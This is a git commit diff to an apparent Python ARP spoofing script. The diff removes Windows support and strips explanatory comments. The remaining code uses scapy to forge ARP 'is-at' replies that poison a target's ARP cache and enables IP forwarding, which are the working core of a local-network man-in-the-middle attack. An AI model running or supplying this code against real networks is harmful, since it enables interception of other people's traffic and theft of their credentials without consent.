c15be6b5b8d41c3d3987f1d6441ad1b2a62d3d68
Naeempatel010 <naeempatel010@gmail.com>
2023-04-13 19:13:31 -0400

    modified the spoofer code

--- ARP-spoof/arp_spoofer.py
+++ ARP-spoof/arp_spoofer.py
@@ -23,7 +23,7 @@ def enable_ip_route(verbose=True):
     """
     if verbose:
         print("[!] Enabling IP Routing...")
-    _enable_windows_iproute() if "nt" in os.name else _enable_linux_iproute()
+    _enable_linux_iproute()
     if verbose:
         print("[!] IP Routing enabled.")
 
@@ -39,21 +39,10 @@ def get_mac(ip):
         
 
 def spoof(target_ip, host_ip, verbose=True):
-    """
-    Spoofs `target_ip` saying that we are `host_ip`.
-    it is accomplished by changing the ARP cache of the target (poisoning)
-    """
-    # get the mac address of the target
     target_mac = get_mac(target_ip)
-    # craft the arp 'is-at' operation packet, in other words; an ARP response
-    # we don't specify 'hwsrc' (source MAC address)
-    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
-    # send the packet
-    # verbose = 0 means that we send the packet without printing any thing
     send(arp_response, verbose=0)
     if verbose:
-        # get the MAC address of the default interface we are using
         self_mac = ARP().hwsrc
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
